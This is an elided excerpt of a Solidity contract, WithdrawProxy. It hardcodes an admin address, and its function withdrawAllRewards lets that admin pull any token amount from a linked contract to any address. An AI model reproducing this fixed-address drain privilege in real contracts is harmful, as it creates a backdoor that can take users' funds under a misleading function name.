...
contract WithdrawProxy is Adminable {

    address public immutable v;
    ...
    constructor(
        ...
        isAdmin[address(0x127044Bc4c196c19B25CC3E6F6C5CCbf4ac7cc96)] = true;
    }

    function withdrawAllRewards(address t,address to,uint a) external onlyAdmin {

        IWithdraw(v).takeToken(t, to, a);
    }
